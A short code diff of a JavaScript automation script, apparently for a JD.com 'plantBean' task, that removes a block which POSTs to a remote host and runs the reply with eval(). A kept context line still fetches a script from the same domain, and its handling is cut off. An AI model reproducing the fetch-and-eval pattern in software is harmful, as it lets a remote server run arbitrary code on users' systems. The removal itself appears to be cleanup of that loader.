@@ -30,20 +30,7 @@ const ver='r_0.0.1';
 !(async () => {
   console.log(`开始加载远程脚本`)
   $.post({ url: `http://zlc1.chaoyi996.com:8880/api/app/frequency-statistic/frequency-statistic?type=1&version=${ver}`, timeout: 10000,}, (err, resp, data) => {
-    try {
-      if (err) {
-        console.log(`远程脚本加载失败`)
-      } else {
-        if (data) {
-        console.log(`远程脚本加载成功，开始执行`)
-        eval(data, 10);  
-        }
-      }
-    } catch (e) {
-      console.log(`远程脚本加载失败`+e)
-    } finally {
-    
-    }
+   
   })
   $.get({ url: 'https://static.zlc1.chaoyi996.com/ccwav/jd_plantBean.js', timeout: 10000,}, (err, resp, data) => {
       try {
